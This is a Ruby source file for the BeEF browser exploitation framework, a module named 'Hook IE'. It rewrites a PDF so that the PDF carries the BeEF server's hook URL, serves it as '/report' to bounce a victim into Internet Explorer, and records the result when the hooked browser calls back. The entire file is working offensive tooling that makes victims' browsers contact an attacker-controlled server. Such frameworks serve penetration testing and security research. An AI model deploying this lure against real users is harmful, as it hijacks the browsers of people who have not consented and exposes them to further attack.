#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#

class Hook_ie < BeEF::Core::Command
  
  def initialize
    super({
      'Name' => 'Hook IE',
      'Description' => %Q{
       This module will attempt to hook IE if it is the default browser.'
        },
      'Category' => 'Browser',
      'Author' => ['saafan'],
      'File' => __FILE__
    })
		
		set_target({
        'verified_status' =>  VERIFIED_WORKING, 
        'browser_name' =>     ALL
    })
    
    use 'beef.dom'
    use_template!
  end
  
  def pre_send
    #Get the servers configurations.
    configuration = BeEF::Core::Configuration.instance
		
		#The hook url to be replace the token in the original pdf file.
		hook_uri = "http://#{configuration.get("beef.http.dns")}:#{configuration.get("beef.http.port")}#{configuration.get("beef.http.demo_path")}"
		
		# A new pdf file containg the actual hook URI instead of the dummy token.
		configured_hook_file = File.open("./modules/browser/hook_ie/bounce_to_ie_configured.pdf","w")
		
		# The original pdf file contains a token that will get replaced during the initialization with
		# the actual hook URI of beef. Note that the hook URI is accessed via the DNS name.
		
		#xntrik - unsure what happens to this file after it's been re-written, <hookURI> will never be found again because it's been re-written?
		File.open('./modules/browser/hook_ie/bounce_to_ie.pdf',"r") { |original_hook_file|
			original_hook_file.each_line { |line|				
				# If the line includes the hook token, then replace it with the actual hook URI
				if(line.include? '<hookURI>')
					line = line.sub(/<hookURI>/, hook_uri)
				end
				#write the line to a new file
				configured_hook_file.write(line)
			}
		}
		
		configured_hook_file.close()
		
		
		#Bind the configured PDF file to the web server.
		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/browser/hook_ie/bounce_to_ie_configured.pdf', '/report', 'pdf', -1); 
    
  end

  def callback
    content = {}
    content['result'] = @datastore['result']   
    
    #Unmount the assetnow that we've received the callback
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/report.pdf'); 
    
    save content
    #update_zombie!
  end
  
end